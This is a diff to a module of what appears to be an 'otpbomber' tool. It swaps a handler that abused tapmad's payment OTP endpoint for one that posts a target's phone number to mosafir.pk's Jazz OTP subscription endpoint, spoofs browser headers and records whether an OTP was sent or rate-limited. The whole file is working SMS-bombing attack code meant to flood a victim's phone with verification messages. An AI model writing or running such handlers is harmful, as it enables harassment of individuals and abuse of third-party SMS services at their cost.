@@ -1,37 +1,44 @@
 from otpbomber.core import *
 from otpbomber.localuseragent import *
 
-async def tapmad(phone, client, out):
-    name = "tapmad"
-    domain = "tapmad"
+async def mosafir(phone, client, out):
+    name = "mosafir"
+    domain = "mosafir"
     frequent_rate_limit=False
 
     headers = {
             "user-agent": random.choice(ua["browsers"]["chrome"]),
     }
-    json_data = {
-        'Version': 'V1',
-        'Language': 'en',
-        'Platform': 'web',
-        'ProductId': 1733,
-        'MobileNo': f"{phone[-10:]}",
-        'OperatorId': '100007',
-        'URL': 'https://www.tapmad.com/sign-up',
-        'source': 'organic',
-        'medium': 'organic',
+    headers = {
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+         'Origin': 'http://www.sub.mosafir.pk',
+        'Referer': 'http://www.sub.mosafir.pk/',
+        'User-Agent': random.choice(ua["browsers"]["chrome"]),
+        'X-Requested-With': 'XMLHttpRequest',
+    }
+
+    data = {
+        'contact_number': f"{phone[1:]}",
+        'function_to_call': '0',
+        'otp': '',
+        'digit-1': '',
+        'digit-2': '',
+        'digit-3': '',
+        'digit-4': '',
     }
 
     response = await client.post(
-        'https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage',
+        'http://www.sub.mosafir.pk/subscription/jazzOTP_subscription.php',
         headers=headers,
-        json=json_data,
+        data=data
     )
     try:
         data=response.json()
-        if data["Response"]['message'] == "OTP Code send Successfuly.":
+        if data["msg"] == "Success":
             out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
             return None
-        if data["Response"]['status'] == "Threshold":
+        if data["msg"] == "Pin Not Allowed":
             out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
             return None
     except Exception:
